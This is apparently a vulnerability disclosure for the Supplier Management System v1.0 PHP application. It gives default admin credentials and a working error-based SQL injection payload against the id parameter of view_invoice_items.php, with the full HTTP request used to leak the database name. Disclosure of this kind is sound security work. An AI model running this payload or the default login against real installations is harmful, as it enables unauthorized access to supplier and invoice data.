# Supplier Management System v1.0 has SQL injection

BUG_AUTHOR: Chen haokun

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/supplier-management-system-using-php-mysql/

Vulnerability File: /Supply_Management_System/admin/view_invoice_items.php?id=

Vulnerability location: /Supply_Management_System/admin/view_invoice_items.php, id

Current database name: sourcecodester_scm_new

[+] Payload: /Supply_Management_System/admin/view_invoice_items.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)-- // Leak place ---> id

```sql
GET /Supply_Management_System/admin/view_invoice_items.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lnrmrcve0bbe6h4i3h1cn01oee
Connection: close
```

![image](https://github.com/user-attachments/assets/252d2588-ebd8-498c-a106-8cd483049991)
